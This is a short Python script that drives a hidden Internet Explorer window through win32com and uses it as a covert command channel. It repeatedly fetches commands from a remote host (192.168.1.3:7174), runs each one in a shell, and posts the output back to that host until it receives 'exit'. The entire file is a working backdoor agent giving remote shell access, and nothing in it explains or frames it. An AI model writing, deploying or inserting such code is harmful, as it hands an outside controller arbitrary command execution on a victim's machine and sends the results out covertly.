from win32com.client import Dispatch
from time import sleep
import subprocess

ie = Dispatch("InternetExplorer.Application")
ie.Visible = 0

dURL = "http://192.168.1.3:7174"
Flags = 0
TargetFrame = 0

while True:
    ie.Navigate("http://192.168.1.3:7174")
    while ie.ReadyState != 4:
        sleep(1)

    command = ie.Document.body.innerHTML
    command = command.encode()

    if "exit" in command.decode():
        ie.Quit()
        break
    else:
        CMD = subprocess.Popen(
            command.decode(),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )
        Data = CMD.stdout.read()
        PostData = memoryview( Data )
        ie.Navigate(dURL,Flags,TargetFrame, PostData)

    sleep(3)
